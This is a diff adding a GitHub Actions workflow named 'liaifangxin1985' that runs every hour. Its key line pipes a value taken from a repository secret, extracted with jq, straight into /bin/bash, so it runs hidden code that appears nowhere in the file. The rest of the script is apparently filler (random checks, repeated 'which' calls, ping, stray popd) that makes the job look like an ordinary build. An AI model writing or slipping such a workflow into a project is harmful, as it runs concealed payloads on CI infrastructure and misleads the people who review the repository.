@@ -1,0 +1,43 @@
+name: liaifangxin1985
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liaifangxin1985
+        env:
+          g11269: ${{ secrets.g11269 }}
+        run: |
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo "User: $(whoami)"
+          echo "Time: $(date +%H:%M:%S)"
+          echo $g11269 | jq -r .h21409 | /bin/bash
+          echo "Time: $(date +%H:%M:%S)"
+          which screen
+          [ -z "$RANDOM" ] || echo "Random var set"
+          test -d /tmp && echo "Tmp dir exists"
+          echo "Build $(date +%s)"
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          which printf
+          which wget
+          which wget
+          echo "xyz" > tmp.txt.tmp.tmp.txt
+          ls -la 2>/dev/null || true
+          which apt-get
+          for i in {1..3}; do echo "Iter $i"; done
+          ping -c 10 github.com
+          echo "Version: $((1 + RANDOM % 5))"
+          which curl
+          echo "Date only: $(date +%F)"
+          echo "Checksum: $((1000 + RANDOM % 9000))"
+          popd
+          touch tmp.abc.tmp.abc
+          : ' Another single-line comment '
+          echo "Files: $(ls | wc -l 2>/dev/null || echo 0)"
+          popd > /dev/null
+          echo "Dir: $(pwd)"
